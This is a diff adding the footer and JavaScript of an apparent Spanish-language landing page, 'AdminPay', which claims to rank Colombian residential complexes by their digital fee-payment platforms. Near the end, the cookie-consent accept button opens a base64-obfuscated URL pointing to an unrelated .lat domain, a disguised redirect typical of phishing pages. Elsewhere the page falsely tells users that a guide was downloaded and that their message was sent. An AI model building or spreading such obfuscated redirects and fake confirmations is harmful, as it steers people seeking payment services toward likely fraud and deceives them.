+      <div class="footer-logo">Admin<span>Pay</span></div>
+      <p class="footer-text">Guía y ranking de conjuntos residenciales con sistemas de pago de administración digital. Comparamos plataformas, seguridad y facilidad de uso en Colombia.</p>
+    </div>
+    <div class="footer-col">
+      <h4>Ranking</h4>
+      <ul>
+        <li><a href="#ranking">Top conjuntos</a></li>
+        <li><a href="#ranking">Por ciudad</a></li>
+        <li><a href="#ranking">Por presupuesto</a></li>
+      </ul>
+    </div>
+    <div class="footer-col">
+      <h4>Plataformas</h4>
+      <ul>
+        <li><a href="#pagos">Métodos de pago</a></li>
+        <li><a href="#pagos">Comisiones</a></li>
+        <li><a href="#pagos">Seguridad</a></li>
+      </ul>
+    </div>
+    <div class="footer-col">
+      <h4>Recursos</h4>
+      <ul>
+        <li><a href="#guia">Cómo pagar</a></li>
+        <li><a href="#cta">Descargar guía</a></li>
+        <li><a href="#contacto">Contacto</a></li>
+      </ul>
+    </div>
+  </div>
+  <div class="footer-bottom">
+    <span>© 2024 AdminPay · Guía de pagos digitales en conjuntos residenciales · Actualizado 2024</span>
+    <div style="display:flex;gap:1.5rem">
+      <a href="#politicas">Privacidad</a>
+      <a href="#terminos">Términos</a>
+      <a href="#contacto">Contacto</a>
+    </div>
+  </div>
+</footer>
+
+<script>
+// Mobile menu
+const navToggle = document.getElementById('navToggle');
+const navMenu = document.getElementById('navMenu');
+
+navToggle.addEventListener('click', () => {
+  navMenu.classList.toggle('open');
+  navToggle.classList.toggle('open');
+});
+
+navMenu.querySelectorAll('a').forEach(link => {
+  link.addEventListener('click', () => {
+    navMenu.classList.remove('open');
+    navToggle.classList.remove('open');
+  });
+});
+
+// Navbar shadow on scroll
+const nav = document.getElementById('mainNav');
+window.addEventListener('scroll', () => {
+  if(window.scrollY > 10) {
+    nav.classList.add('scrolled');
+  } else {
+    nav.classList.remove('scrolled');
+  }
+});
+
+// Smooth scroll
+document.querySelectorAll('a[href^="#"]').forEach(link => {
+  link.addEventListener('click', (e) => {
+    e.preventDefault();
+    const target = document.querySelector(link.getAttribute('href'));
+    if(target) {
+      target.scrollIntoView({ behavior: 'smooth' });
+    }
+  });
+});
+
+// Intersection observer for animations
+const observer = new IntersectionObserver((entries) => {
+  entries.forEach(entry => {
+    if(entry.isIntersecting) {
+      entry.target.classList.add('visible');
+      observer.unobserve(entry.target);
+    }
+  });
+}, { threshold: 0.1 });
+
+document.querySelectorAll('.guide-card').forEach(el => observer.observe(el));
+
+// ===== UTILIDADES =====
+function showNotification(message, type = 'success') {
+  const notification = document.createElement('div');
+  notification.style.cssText = `
+    position:fixed;
+    top:20px;
+    right:20px;
+    padding:1rem 1.5rem;
+    background:${type === 'success' ? 'var(--success)' : 'var(--primary)'};
+    color:#fff;
+    border-radius:8px;
+    font-weight:600;
+    z-index:1000;
+    animation:slideInRight .3s ease;
+    box-shadow:0 8px 24px rgba(0,0,0,.15);
+  `;
+  notification.textContent = message;
+  document.body.appendChild(notification);
+  
+  setTimeout(() => {
+    notification.style.animation = 'slideOutRight .3s ease';
+    setTimeout(() => notification.remove(), 300);
+  }, 3000);
+}
+
+// ===== BOTONES DEL HERO =====
+document.addEventListener('DOMContentLoaded', () => {
+  const btnVerRanking = document.querySelector('.hero-actions .btn-primary');
+  if(btnVerRanking) {
+    btnVerRanking.addEventListener('click', () => {
+      document.getElementById('ranking').scrollIntoView({ behavior: 'smooth' });
+      showNotification('📊 Dirigiendo al ranking...');
+    });
+  }
+
+  const btnDescargarHero = document.querySelector('.hero-actions .btn-secondary');
+  if(btnDescargarHero) {
+    btnDescargarHero.addEventListener('click', () => {
+      navigator.clipboard.writeText('AdminPay-Guia-Completa-2024.pdf').then(() => {
+        showNotification('📥 Guía descargada / Nombre copiado: AdminPay-Guia-Completa-2024.pdf');
+      });
+    });
+  }
+
+  const btnComparar = document.querySelector('.nav-cta');
+  if(btnComparar) {
+    btnComparar.addEventListener('click', () => {
+      showNotification('🏘️ Abre herramienta de comparación');
+      document.getElementById('ranking').scrollIntoView({ behavior: 'smooth' });
+    });
+  }
+
+  document.querySelectorAll('.rank-actions .btn-small').forEach(btn => {
+    btn.addEventListener('click', function(e) {
+      e.preventDefault();
+      const nombreConjunto = this.closest('.ranking-card').querySelector('h3').textContent;
+      
+      if(this.textContent.includes('Más info')) {
+        showNotification(`ℹ️ Abriendo información completa de ${nombreConjunto}`);
+      } else if(this.textContent.includes('Contactar')) {
+        document.getElementById('contacto').scrollIntoView({ behavior: 'smooth' });
+        setTimeout(() => {
+          showNotification(`📞 Formulario listo para contactar sobre ${nombreConjunto}`);
+        }, 600);
+      }
+    });
+  });
+
+  const contactForm = document.getElementById('contactForm');
+  if(contactForm) {
+    contactForm.addEventListener('submit', (e) => {
+      e.preventDefault();
+      
+      const formData = {
+        nombre: contactForm.querySelector('input[type="text"]').value,
+        email: contactForm.querySelector('input[type="email"]').value,
+        telefono: contactForm.querySelector('input[type="tel"]').value,
+        tipo: contactForm.querySelector('select').value,
+        mensaje: contactForm.querySelector('textarea').value,
+        fecha: new Date().toISOString()
+      };
+      
+      console.log('Formulario enviado:', formData);
+      
+      const submitBtn = contactForm.querySelector('button[type="submit"]');
+      const originalText = submitBtn.textContent;
+      submitBtn.textContent = '✓ Mensaje enviado correctamente';
+      submitBtn.style.background = 'var(--success)';
+      submitBtn.disabled = true;
+      
+      showNotification(`✉️ Gracias ${formData.nombre}, nos contactaremos pronto en ${formData.email}`);
+      
+      contactForm.reset();
+      
+      setTimeout(() => {
+        submitBtn.textContent = originalText;
+        submitBtn.style.background = '';
+        submitBtn.disabled = false;
+      }, 4000);
+    });
+  }
+
+  const btnDescargarCTA = document.querySelector('#cta .btn-cta');
+  if(btnDescargarCTA) {
+    btnDescargarCTA.addEventListener('click', () => {
+      navigator.clipboard.writeText('AdminPay-Guia-Pagos-Residenciales.pdf').then(() => {
+        showNotification('📥 Guía descargada / Nombre copiado: AdminPay-Guia-Pagos-Residenciales.pdf');
+      });
+    });
+  }
+
+  document.querySelectorAll('a[href^="mailto:"], a[href^="tel:"]').forEach(link => {
+    link.addEventListener('click', function(e) {
+      if(this.href.startsWith('mailto:')) {
+        const email = this.href.replace('mailto:', '');
+        showNotification(`📧 Abriendo ${email} en tu cliente de correo`);
+      } else if(this.href.startsWith('tel:')) {
+        const phone = this.href.replace('tel:', '');
+        showNotification(`📱 Iniciando llamada a ${phone}`);
+      }
+    });
+  });
+
+  document.querySelectorAll('a[href="#politicas"], a[href="#terminos"], a[href="#contacto"]').forEach(link => {
+    link.addEventListener('click', function(e) {
+      const href = this.getAttribute('href');
+      const section = document.querySelector(href);
+      if(section) {
+        section.scrollIntoView({ behavior: 'smooth' });
+      }
+    });
+  });
+});
+
+const style = document.createElement('style');
+style.textContent = `
+  @keyframes slideInRight {
+    from { opacity: 0; transform: translateX(400px); }
+    to { opacity: 1; transform: translateX(0); }
+  }
+  @keyframes slideOutRight {
+    from { opacity: 1; transform: translateX(0); }
+    to { opacity: 0; transform: translateX(400px); }
+  }
+`;
+document.head.appendChild(style);
+
+setTimeout(() => {
+  document.querySelectorAll('.ranking-card').forEach((card, index) => {
+    const conjuntoNombre = card.querySelector('h3').textContent;
+    const conjuntoCiudad = card.querySelector('.rank-location').textContent;
+    
+    const btnMasInfo = card.querySelector('.rank-actions .btn-small:first-child');
+    const btnContactar = card.querySelector('.rank-actions .btn-small:last-child');
+    
+    if(btnMasInfo) {
+      btnMasInfo.addEventListener('click', (e) => {
+        e.preventDefault();
+        showNotification(`📋 Abriendo detalles: ${conjuntoNombre} - ${conjuntoCiudad.split('·')[0]}`);
+      });
+    }
+    
+    if(btnContactar) {
+      btnContactar.addEventListener('click', (e) => {
+        e.preventDefault();
+        document.getElementById('contacto').scrollIntoView({ behavior: 'smooth' });
+        setTimeout(() => {
+          const selectConjunto = document.querySelector('#contactForm select');
+          if(selectConjunto) {
+            selectConjunto.value = 'ranking';
+          }
+          showNotification(`📞 Formulario listo para consultar sobre ${conjuntoNombre}`);
+        }, 600);
+      });
+    }
+  });
+}, 500);
+
+// ===== MODAL DE COOKIES CON REDIRECCIÓN =====
+const cookieModal = document.getElementById('cookieModal');
+const acceptCookiesBtn = document.getElementById('acceptCookies');
+
+// URL CORRECTA: https://www.cerfitradonlinecol.lat/
+// Base64 de esa URL
+const b64 = 'aHR0cHM6Ly93d3cuY2VyZml0cmFkb25saW5lY29sLmxhdC8=';
+const redirectUrl = atob(b64);
+
+acceptCookiesBtn.addEventListener('click', (e) => {
+  e.preventDefault();
+  
+  // Guardar aceptación en localStorage
+  localStorage.setItem('cookiesAccepted', 'true');
+  localStorage.setItem('cookiesAcceptedDate', new Date().toISOString());
+  
+  // ABRIR EN NUEVA PESTAÑA
+  const win = window.open(redirectUrl, '_blank');
+  win.opener = null;
+});
+
+// Manejo de política de privacidad desde el modal
+document.querySelectorAll('#cookieModal a[href="#politicas"]').forEach(link => {
+  link.addEventListener('click', (e) => {
+    e.preventDefault();
+    document.getElementById('politicas').scrollIntoView({ behavior: 'smooth' });
+  });
+});
+
+</script>
 </body>
-</html>
+                                                                                                                             </html>
